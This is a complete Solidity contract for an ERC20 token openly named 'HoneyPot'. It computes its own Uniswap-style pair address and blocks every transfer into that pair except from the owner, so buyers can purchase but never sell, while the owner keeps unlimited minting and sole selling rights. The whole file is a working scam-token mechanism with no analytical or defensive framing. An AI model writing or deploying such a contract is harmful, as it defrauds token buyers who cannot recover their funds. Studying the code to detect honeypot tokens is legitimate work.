// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";

contract HoneyPot is ERC20, Ownable {

  error DeniedFrom();

  event Mint(address indexed to, uint256 amount);

  address private _pair;

  constructor() ERC20("HoneyPot", "HP") {
    // calculate _pair address
    address factory = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address weth = 0xB4FBF271143F4FBf7B91A5ded31805e42b2208d6;
    address hp = address(this);
    (address token0, address token1) = weth < hp ? (weth, hp) : (hp, weth);
    bytes32 salt = keccak256(abi.encodePacked(token0, token1));
    bytes32 pairBytecodeHash = hex"96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f";
    _pair = address(uint160(uint256(keccak256(abi.encodePacked(
        hex"ff",
        factory,
        salt,
        pairBytecodeHash
      )))));
  }

  function mint(address to, uint256 amount) external onlyOwner {
    _mint(to, amount);
    emit Mint(to, amount);
  }

  function _beforeTokenTransfer(
    address from,
    address to,
    uint256 amount
  ) internal view override {
    if (to == _pair && from != owner()) {
      revert DeniedFrom();
    }
  }
}